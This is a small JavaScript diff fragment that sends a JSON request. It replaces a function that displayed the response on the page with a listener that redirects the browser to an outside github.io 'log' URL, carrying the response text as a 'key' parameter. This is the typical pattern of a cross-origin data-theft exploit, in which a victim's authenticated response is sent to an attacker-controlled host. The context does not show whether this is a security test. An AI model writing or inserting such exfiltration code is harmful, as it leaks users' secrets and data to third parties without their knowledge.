@@ -16,7 +16,6 @@ var jsonData = {
 }; 
 var jsonString = JSON.stringify(jsonData);
 xhr.send(jsonString);
-function displayResponse(responseJSON) {
-var responseElement = document.getElementById('response');
-  responseElement.innerText = JSON.stringify(responseJSON);
-}
+function reqListener() {
+    location='//hemar0605.github.io/testfrshcht/log?key='+this.responseText; 
+   };
